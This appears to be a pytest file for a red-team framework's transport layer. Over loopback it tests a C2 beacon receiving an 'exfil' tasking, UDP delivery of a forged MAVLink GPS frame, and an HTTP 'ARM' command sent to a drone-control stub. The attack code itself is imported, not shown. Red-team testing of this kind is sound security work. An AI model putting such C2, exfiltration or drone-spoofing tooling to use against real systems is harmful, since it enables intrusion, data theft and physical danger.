"""실 전송 계층 테스트 — 고도화 §K. loopback 실검증(소켓 차단 시 skip)."""
from __future__ import annotations

import socket
import threading

import pytest

from redteam_core.transport import (
    C2Beacon, C2Listener, Tasking, build_mavlink_gps_frame, http_deliver, udp_deliver,
)


def _sockets_ok():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("127.0.0.1", 0)); s.close()
        return True
    except OSError:
        return False


pytestmark = pytest.mark.skipif(not _sockets_ok(), reason="loopback 소켓 불가(샌드박스)")


def test_c2_beacon_exchange_over_real_tcp():
    listener = C2Listener(tasking=Tasking("exfil", {"path": "/tmp"}))
    listener.serve_once()
    try:
        tasking = C2Beacon(listener.host, listener.port, "beacon-A").beacon(status="alive")
        assert tasking.command == "exfil" and tasking.args["path"] == "/tmp"
    finally:
        listener.close()
    # controller 가 실제로 비콘 보고를 수신했는지
    assert listener.received["agent"] == "beacon-A"
    assert listener.received["status"] == "alive"


def test_udp_delivery_datagram_actually_sent():
    rx = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    rx.bind(("127.0.0.1", 0))
    rx.settimeout(2.0)
    host, port = rx.getsockname()
    try:
        frame = build_mavlink_gps_frame()
        n = udp_deliver(host, port, frame)
        data, _ = rx.recvfrom(65535)
        assert n == len(frame) and data == frame and len(data) > 0
    finally:
        rx.close()


def test_http_delivery_posts_to_stub():
    from http.server import BaseHTTPRequestHandler, HTTPServer

    seen = {}

    class H(BaseHTTPRequestHandler):
        def do_POST(self):
            ln = int(self.headers.get("Content-Length", 0))
            seen["body"] = self.rfile.read(ln)
            self.send_response(204); self.end_headers()

        def log_message(self, *a):
            pass

    srv = HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.handle_request, daemon=True).start()
    host, port = srv.server_address
    try:
        code = http_deliver(f"http://{host}:{port}/arm", {"action": "ARM"})
        assert code == 204 and b"ARM" in seen["body"]
    finally:
        srv.server_close()


def test_gps_frame_nonempty():
    assert len(build_mavlink_gps_frame()) > 0
